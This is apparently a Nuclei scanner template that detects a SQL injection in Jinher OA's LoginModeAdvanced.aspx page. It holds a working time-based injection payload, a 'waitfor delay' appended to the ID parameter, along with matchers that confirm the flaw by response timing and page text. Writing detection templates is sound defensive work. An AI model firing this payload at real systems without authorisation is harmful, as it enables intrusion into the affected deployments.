id: jinher-loginmodeadvanced-sqli
info:
  name: Jinher OA LoginModeAdvanced.aspx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Jinher OA LoginModeAdvanced.aspx is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx/?ID=1;waitfor+delay'0:0:{{t1}}' HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "传统模式设置"
          - "登录图片设置"
          - "背景设置"
          - "JHSoft"
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
